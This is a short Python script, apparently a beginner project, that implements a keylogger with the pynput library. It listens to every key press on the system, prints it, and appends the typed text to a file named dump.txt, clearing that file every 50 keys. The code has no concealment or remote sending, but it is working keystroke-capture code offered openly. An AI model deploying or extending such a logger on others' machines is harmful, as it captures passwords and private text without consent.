import pynput
from pynput.keyboard import Key,Listener #importing libraries
    
keys=[]
c=0



def on_press(key):
    global keys,c  #making count , keys, c global variable so that they can be used in every function

    print("{0}pressed".format(key))   #printing he key that is pressed by user

    keys.append(key)  #appending key into keys
    c= c+1
        
    dump(keys)   #calling dump function
    keys=[]
    if c>50:
        c=0
        delete_file()  #calling delete function



def dump(keys):  #this function will print every keystrokes into a specific folder
    with open("dump.txt","a") as f:
        
        for key in keys:
            k=str(key).replace("'","")
                
            if k.find('space') >0:
                f.write(" ")
            elif k.find('enter') >0:
                f.write("\n")
            elif k.find('Key') == -1:
                f.write(k)
                
        
def delete_file():  #this function will delete all the data that is dumped so that it does not take huge amount of space after a certain time
    d=open('dump.txt' , 'r+')
    d.truncate(0)
    d.close()



with Listener(on_press=on_press) as listener:  #setting up the listener
    listener.join()

